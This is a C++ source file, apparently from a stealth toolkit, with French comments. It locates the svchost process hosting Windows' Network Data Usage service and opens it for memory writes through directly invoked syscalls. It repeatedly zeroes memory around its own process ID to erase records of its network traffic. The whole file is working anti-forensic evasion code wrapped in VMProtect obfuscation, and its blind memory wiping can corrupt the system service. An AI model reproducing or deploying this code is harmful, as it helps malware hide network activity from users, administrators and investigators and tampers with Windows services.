#pragma optimize("", off)
#include "whipnexus/NduMemoryCleaner.h"
#include "whipnexus/SyscallManager.h"
#include "whipsyscall/SyscallInvoker.h"

#ifdef BUILD_WITH_VMPROTECT
#include "VMProtectSDK.h"
#endif

#include <windows.h>
#include <tlhelp32.h>

volatile bool NduMemoryCleaner::activeCleaningRunning = false;
void* NduMemoryCleaner::activeCleaningThreadHandle = nullptr;
u32 NduMemoryCleaner::cleaningIntervalMs = 500;

bool NduMemoryCleaner::ClearCurrentProcessStats() {
    VMProtectBeginUltra("NduMemoryCleaner_ClearCurrentProcessStats");
    u32 currentPid = GetCurrentProcessId();
    bool result = ClearProcessStats(currentPid);
    return result;
    VMProtectEnd();
}

bool NduMemoryCleaner::ClearProcessStats(u32 targetPid) {
    VMProtectBeginUltra("NduMemoryCleaner_ClearProcessStats");

    // 1. Trouver le svchost.exe qui héberge NDU
    u32 nduHostPid = FindNduServiceHost();
    if (nduHostPid == 0) {
        return false;
    }

    // 2. Ouvrir le processus avec tous les droits
    SyscallResolver* res = SyscallManager::GetResolver();
    WORD ssn;
    PVOID addr;

    if (!res->ResolveByName("NtOpenProcess", ssn, addr)) {
        return false;
    }

    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);

    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)nduHostPid;
    clientId.UniqueThread = nullptr;

    NTSTATUS status = (NTSTATUS)SyscallInvoker::Invoke(
        ssn,
        &hProcess,
        (PVOID)(ULONG_PTR)(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION),
        &objAttr,
        &clientId
    );

    if (status != 0 || !hProcess) {
        return false;
    }

    // 3. Scanner et effacer la mémoire
    bool result = ScanAndClearMemory(hProcess, targetPid);

    // 4. Fermer le handle
    if (res->ResolveByName("NtClose", ssn, addr)) {
        SyscallInvoker::Invoke(ssn, hProcess);
    }

    return result;
    VMProtectEnd();
}

u32 NduMemoryCleaner::FindNduServiceHost() {
    VMProtectBeginUltra("NduMemoryCleaner_FindNduServiceHost");

    // Utiliser CreateToolhelp32Snapshot pour énumérer les processus
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    u32 nduPid = 0;
    do {
        // Chercher tous les svchost.exe
        if (lstrcmpiW(pe32.szExeFile, L"svchost.exe") == 0) {
            // Ouvrir le processus pour vérifier s'il héberge NDU
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                // Scanner la mémoire pour la signature "Ndu" ou structures NDU
                SyscallResolver* res = SyscallManager::GetResolver();
                WORD ssn;
                PVOID addr;

                if (res->ResolveByName("NtReadVirtualMemory", ssn, addr)) {
                    // Scanner les premières régions mémoire pour signature NDU
                    byte buffer[4096];
                    SIZE_T bytesRead = 0;

                    // Signature: chercher "Ndu" en mémoire
                    const char* nduSig = "Ndu";

                    for (uintptr_t address = 0x10000; address < 0x7FFFFFFF; address += 0x10000) {
                        NTSTATUS status = (NTSTATUS)SyscallInvoker::Invoke(
                            ssn, hProcess, (PVOID)address, buffer, (PVOID)(ULONG_PTR)sizeof(buffer), &bytesRead
                        );

                        if (status == 0 && bytesRead > 0) {
                            // Chercher la signature "Ndu"
                            for (SIZE_T i = 0; i < bytesRead - 3; i++) {
                                if (buffer[i] == 'N' && buffer[i+1] == 'd' && buffer[i+2] == 'u') {
                                    nduPid = pe32.th32ProcessID;
                                    CloseHandle(hProcess);
                                    CloseHandle(hSnapshot);
                                    return nduPid;
                                }
                            }
                        }

                        // Limiter le scan pour éviter de prendre trop de temps
                        if (address > 0x1000000) break;
                    }
                }

                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return nduPid;
    VMProtectEnd();
}

bool NduMemoryCleaner::ScanAndClearMemory(void* hProcess, u32 targetPid) {
    VMProtectBeginUltra("NduMemoryCleaner_ScanAndClearMemory");

    SyscallResolver* res = SyscallManager::GetResolver();
    WORD ssnQuery, ssnRead, ssnWrite;
    PVOID addrQuery, addrRead, addrWrite;

    if (!res->ResolveByName("NtQueryVirtualMemory", ssnQuery, addrQuery)) return false;
    if (!res->ResolveByName("NtReadVirtualMemory", ssnRead, addrRead)) return false;
    if (!res->ResolveByName("NtWriteVirtualMemory", ssnWrite, addrWrite)) return false;

    bool foundAndCleared = false;

    // Scanner toutes les régions mémoire du processus
    for (uintptr_t address = 0; address < 0x7FFFFFFF; address += 0x10000) {
        MEMORY_BASIC_INFORMATION mbi = { 0 };
        SIZE_T returnLength = 0;

        NTSTATUS status = (NTSTATUS)SyscallInvoker::Invoke(
            ssnQuery, hProcess, (PVOID)address, (PVOID)(ULONG_PTR)0 /*MemoryBasicInformation*/,
            &mbi, (PVOID)(ULONG_PTR)sizeof(mbi), &returnLength
        );

        if (status != 0) {
            break;
        }

        // Chercher dans les pages RW (lecture/écriture) car les stats sont modifiables
        if ((mbi.State == MEM_COMMIT) &&
            (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_EXECUTE_READWRITE)) {

            if (FindAndClearStatsStructures(hProcess, (byte*)mbi.BaseAddress, (u32)mbi.RegionSize, targetPid)) {
                foundAndCleared = true;
            }
        }

        address = (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
    }

    return foundAndCleared;
    VMProtectEnd();
}

bool NduMemoryCleaner::FindAndClearStatsStructures(void* hProcess, byte* regionBase, u32 regionSize, u32 targetPid) {
    VMProtectBeginUltra("NduMemoryCleaner_FindAndClearStatsStructures");

    if (regionSize > 10 * 1024 * 1024) {
        return false; // Ignorer les régions trop grandes
    }

    SyscallResolver* res = SyscallManager::GetResolver();
    WORD ssnRead, ssnWrite;
    PVOID addrRead, addrWrite;

    if (!res->ResolveByName("NtReadVirtualMemory", ssnRead, addrRead)) return false;
    if (!res->ResolveByName("NtWriteVirtualMemory", ssnWrite, addrWrite)) return false;

    // Allouer buffer pour lire la région
    byte* buffer = (byte*)SyscallManager::GetWrappers()->HeapAlloc(regionSize);
    if (!buffer) return false;

    SIZE_T bytesRead = 0;
    NTSTATUS status = (NTSTATUS)SyscallInvoker::Invoke(
        ssnRead, hProcess, regionBase, buffer, (PVOID)(ULONG_PTR)regionSize, &bytesRead
    );

    if (status != 0 || bytesRead == 0) {
        SyscallManager::GetWrappers()->HeapFree(buffer);
        return false;
    }

    bool found = false;

    // Chercher le PID dans la mémoire (aligné sur 4 bytes)
    for (u32 i = 0; i < bytesRead - sizeof(u32); i += 4) {
        u32* pidPtr = (u32*)(buffer + i);

        if (*pidPtr == targetPid) {
            // Trouvé une occurrence du PID - vérifier le contexte
            // Les structures de stats réseau contiennent généralement:
            // - PID (4 bytes)
            // - BytesSent (8 bytes)
            // - BytesReceived (8 bytes)
            // - Timestamp, etc.

            // Effacer une zone de ~256 bytes autour du PID trouvé
            u32 clearStart = (i > 128) ? (i - 128) : 0;
            u32 clearEnd = ((i + 256) < bytesRead) ? (i + 256) : bytesRead;

            // Zeroing la zone
            SyscallManager::SecureZero(buffer + clearStart, clearEnd - clearStart);

            // Écrire la mémoire modifiée
            SIZE_T bytesWritten = 0;
            status = (NTSTATUS)SyscallInvoker::Invoke(
                ssnWrite, hProcess, regionBase + clearStart,
                buffer + clearStart, (PVOID)(ULONG_PTR)(clearEnd - clearStart), &bytesWritten
            );

            if (status == 0) {
                found = true;
            }
        }
    }

    SyscallManager::GetWrappers()->HeapFree(buffer);
    return found;
    VMProtectEnd();
}

bool NduMemoryCleaner::StartActiveCleaning(u32 intervalMs) {
    VMProtectBeginUltra("NduMemoryCleaner_StartActiveCleaning");

    // Vérifier si déjà en cours
    if (activeCleaningRunning) {
        return false;
    }

    cleaningIntervalMs = intervalMs;
    activeCleaningRunning = true;

    // Créer le thread de nettoyage
    DWORD threadId = 0;
    activeCleaningThreadHandle = CreateThread(
        nullptr,
        0,
        ActiveCleaningThread,
        nullptr,
        0,
        &threadId
    );

    if (!activeCleaningThreadHandle) {
        activeCleaningRunning = false;
        return false;
    }

    return true;
    VMProtectEnd();
}

void NduMemoryCleaner::StopActiveCleaning() {
    VMProtectBeginUltra("NduMemoryCleaner_StopActiveCleaning");

    if (!activeCleaningRunning) {
        return;
    }

    // Signaler l'arrêt
    activeCleaningRunning = false;

    // Attendre que le thread se termine (max 2 secondes)
    if (activeCleaningThreadHandle) {
        WaitForSingleObject(activeCleaningThreadHandle, 2000);
        CloseHandle(activeCleaningThreadHandle);
        activeCleaningThreadHandle = nullptr;
    }

    VMProtectEnd();
}

bool NduMemoryCleaner::IsActiveCleaning() {
    return activeCleaningRunning;
}

unsigned long __stdcall NduMemoryCleaner::ActiveCleaningThread(void* param) {
    VMProtectBeginUltra("NduMemoryCleaner_ActiveCleaningThread");

    u32 currentPid = GetCurrentProcessId();

    while (activeCleaningRunning) {
        // Nettoyer les stats
        ClearProcessStats(currentPid);

        // Attendre l'intervalle
        Sleep(cleaningIntervalMs);
    }

    return 0;
    VMProtectEnd();
}